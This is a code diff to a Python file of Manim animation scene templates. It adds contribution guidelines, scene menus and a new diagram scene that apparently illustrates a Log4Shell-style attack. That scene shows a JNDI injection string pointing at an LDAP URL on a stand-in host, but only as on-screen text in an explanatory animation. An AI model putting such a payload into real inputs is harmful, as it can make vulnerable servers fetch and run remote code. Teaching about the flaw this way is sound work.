@@ -7,6 +7,7 @@ Created on Mon May 23 11:45:03 2022
 General guidelines on writing and contributing to the scene templates
 
 1. Every scene should have 'self.wait(1)' at the start and the end, regardless of the contents
+
 2. Documentation must be provided on what each scene template does
     2.1. A small description of what the template does
     2.2. Layout parameters includes any useful parameter that helps to change the layout of the scene
@@ -14,10 +15,23 @@ General guidelines on writing and contributing to the scene templates
          adjustments
     2.3. Requirements are the external scenes that the scene requires. Documentation should provide
         clear instructions as to where the resource should be located
+
 3. Grouping objects in the animations is heavily encouraged, it provides overall readability and ease of
    animating
-4. In the case of suggesting a change to the current scene templates, for the sake of intergrity, suggested
-   changes should be written in comments, clearly explaining what was changed from the previous
+
+4. Suggesting scenes and changes-
+       4.1 In the case of suggesting a change to the current scene templates, for the sake of intergrity, suggested
+           changes should be written in comments, clearly explaining what was changed from the previous
+               For an example:
+                   self.wait(5) #was 1 changed to 5
+                   
+       4.2 Template suggestions should be inserted to the sub menu of the respective scene template in brackets
+               For an example:
+                   Scene Templates 9 - Image templates
+                   1. AlreadyExistingScene
+                   2. AnotherScene
+                   3. (SuggestedScene)  <-- Suggestion
+           Furthermore, a brief explanation of the suggestion should be provided in comments.
 
 ===========================================================================================================      
 """
@@ -27,6 +41,9 @@ import numpy as np
 """
 ===========================================================================================================
 Scene Templates 1 - Introduction Scenes
+===========================================================================================================
+1. IntroCard
+2. TitleText
 ===========================================================================================================
 """
 
@@ -87,6 +104,10 @@ class TitleText(Scene):
 """
 ===========================================================================================================
 Scene Templates 2 - Text related scenes
+===========================================================================================================
+1. QuotesScene
+2. ColoredTextScene
+3. PlainContentwithBullets
 ===========================================================================================================
 """
 
@@ -200,3 +221,47 @@ class PlainContentwithBullets(Scene):
         self.play(AnimationGroup(*animationbullets,lag_ratio=0.5))
         self.wait(3)
         self.play(FadeOut(text1),FadeOut(gr1))
+        
+
+"""
+===========================================================================================================
+Scene Templates 3 - Diagram scenes and animations
+===========================================================================================================
+"""
+"""
+DiagramScene1-
+"""
+
+class DiagramScene1(Scene):
+    def construct(self):
+        text1=Text("${jndi:<lookup>}",
+                    font='Courier New',font_size=40)
+        text2=Text("${jndi:ldap://example.com/file}",
+                    font='Courier New',font_size=40)
+        
+        self.wait(1)
+        self.play(FadeIn(text1))
+        self.wait(3)
+        self.play(text1.animate.shift(1.3*UP).scale(0.9))
+        self.wait(0.25)
+        sq1=Square().shift(0.9*DOWN+2*LEFT)
+        sq2=Square().shift(0.9*DOWN+2*RIGHT)
+        arr=Arrow(buff=0.3,start=RIGHT,end=LEFT).shift(0.9*DOWN)
+        cir = Circle(radius=0.25, color=BLUE_B, fill_opacity=1).shift(0.9*DOWN+2*RIGHT)
+        lbl1=Text('LDAP', font='Arial',font_size=15).next_to(sq1,DOWN)
+        lbl2=Text('External Source', font='Arial',font_size=15).next_to(sq2,DOWN)
+        lbl3=Text('Code', font='Arial',font_size=15).next_to(cir,UP)
+        gr1=VGroup(sq1,sq2)
+        gr2=VGroup(lbl1,lbl2)
+        gr3=VGroup(cir,lbl3)
+        
+        self.play(FadeIn(gr1),FadeIn(gr2))
+        self.wait(1)
+        self.play(FadeIn(gr3),FadeIn(arr,shift=LEFT))
+        self.wait(1)
+        self.play(gr3.animate.shift(4*LEFT))
+        self.wait(1)
+        self.play(FadeOut(gr1),FadeOut(gr2),FadeOut(gr3),FadeOut(arr))
+        self.play(text1.animate.move_to(ORIGIN).scale(1.1))
+        self.play(ReplacementTransform(text1,text2))
+        self.wait(1)
